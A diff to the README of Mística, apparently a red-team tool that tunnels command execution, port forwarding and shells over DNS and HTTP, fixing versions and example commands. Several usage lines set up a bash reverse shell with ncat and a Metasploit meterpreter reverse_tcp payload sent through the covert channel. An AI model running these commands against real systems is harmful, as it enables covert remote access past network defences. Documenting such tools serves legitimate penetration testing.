@@ -26,13 +26,20 @@ There are two main pieces of sofware:
 
 The project has very few dependencies. Currently:
 
-- Mística Client needs at least Python 3.6
+- Mística Client needs at least Python 3.7
 - Mística Server needs at least Python 3.7 and `dnslib`.
 
 ```
 python3.7 -m pip install pip --user
 pip3.7 install dnslib --user
 ```
+
+If you don't want to install python on your system, you can use one of the following portable versions:
+
+- https://www.anaconda.com/distribution/#download-section (for Windows, Linux and macOS)
+- https://github.com/winpython/winpython/releases/tag/2.1.20190928 (only for Windows)
+
+> Remember: python >= 3.6 for the client and python >= 3.7 for the server
 
 ## Current modules
 
@@ -191,7 +198,7 @@ In order to illustrate the different methods of DNS encapsulation, the IO redire
       - `./mc.py -m io:dns -k "rc4testkey" -w "--domain mistica.dev"`
 - TXT query, specifying port and hostname:
   - Mística Server: `./ms.py -m io:dns -k "rc4testkey" -s "--hostname 0.0.0.0 --port 1337"`
-  - Mística Client:  `./mc.py -m io:dns -k "rc4testkey" -w "--hostname 192.168.43.79 --port 1337"`
+  - Mística Client:  `./mc.py -m io:dns -k "rc4testkey" -w "--hostname x.x.x.x --port 1337"`
 - TXT query, using multiple subdomains:
   - Mística Server: `./ms.py -m io:dns -k "rc4testkey"`
   - Mística Client:  `./mc.py -m io:dns -k "rc4testkey" -w "--multiple --max-size 169"`
@@ -205,22 +212,22 @@ You can get remote command execution using mística over a custom channel, by co
     - Mística Client: `./mc.py -m shell:dns -k "rc4testkey" -w "--hostname x.x.x.x --port 53"`
 
 - Executing commands on server system over HTTP using GET requests:
-    - Mística Server: `./ms.py -m shell:dns -k "rc4testkey" -s "--hostname x.x.x.x  --port 8000"`
-    - Mística Client: `./mc.py -m io:dns -k "rc4testkey" -w "--hostname x.x.x.x --port 8000"`
+    - Mística Server: `./ms.py -m shell:http -k "rc4testkey" -s "--hostname x.x.x.x  --port 8000"`
+    - Mística Client: `./mc.py -m io:http -k "rc4testkey" -w "--hostname x.x.x.x --port 8000"`
 
 ### Port forwarding with tcpconnect and tcplisten
 
 - Remote port forwarding (seen from server) over HTTP. Address `127.0.0.1:4444` on the client will be forwarded to address `127.0.0.1:5555` on the server. There must be already something listening on `5555`.
     - Mística Server: `./ms.py -m tcpconnect:http -k "rc4testkey" -s "--hostname x.x.x.x  --port 8000" -o "--address 127.0.0.1 --port 5555"`
-    - Mística Client: `./mc.py -m tcplisten:dns -k "rc4testkey" -w "--hostname x.x.x.x --port 8000" -o "--address 127.0.0.1 --port 4444"`
+    - Mística Client: `./mc.py -m tcplisten:http -k "rc4testkey" -w "--hostname x.x.x.x --port 8000" -o "--address 127.0.0.1 --port 4444"`
 - Local port forwarding (seen from server) over DNS. Address `127.0.0.1:4444` on the server will be forwarded to address `127.0.0.1:5555` on the client. There must be already something listening on `5555`.
     - Mística Server: `sudo ./ms.py -m tcplisten:dns -k "rc4testkey" -s "--hostname x.x.x.x  --port 53" -o "--address 127.0.0.1 --port 4444"`
     - Mística Client: `./mc.py -m tcpconnect:dns -k "rc4testkey" -w "--hostname x.x.x.x --port 53" -o "--address 127.0.0.1 --port 5555"`
 - HTTP reverse shell using netcat on linux client.
     - Netcat Listener (on server): `nc -nlvp 5555`
     - Mística Server: `./ms.py -m tcpconnect:http -k "rc4testkey" -s "--hostname x.x.x.x  --port 8000" -o "--address 127.0.0.1 --port 5555"`
-    - Mística Client: `./mc.py -m tcplisten:dns -k "rc4testkey" -w "--hostname x.x.x.x --port 8000" -o "--address 127.0.0.1 --port 4444"`
-    - Netcat Shell (on linux client): `nc -nve /bin/bash 127.0.0.1 4444`
+    - Mística Client: `./mc.py -m tcplisten:http -k "rc4testkey" -w "--hostname x.x.x.x --port 8000" -o "--address 127.0.0.1 --port 4444"`
+    - Netcat Shell (on linux client): `ncat -nve /bin/bash 127.0.0.1 4444`
 - Running `meterpreter_reverse_tcp` (linux) over DNS using port forwarding. Payload generated with `msfvenom -p linux/x64/meterpreter_reverse_tcp LPORT=4444 LHOST=127.0.0.1 -f elf -o meterpreter_reverse_tcp_localhost_4444.bin`
     - Run `msfconsole` on server and launch handler with: `handler -p linux/x64/meterpreter_reverse_tcp -H 127.0.0.1 -P 5555`
     - Mística Server: `sudo ./ms.py -m tcpconnect:dns -k "rc4testkey" -s "--hostname x.x.x.x  --port 53" -o "--address 127.0.0.1 --port 5555"`
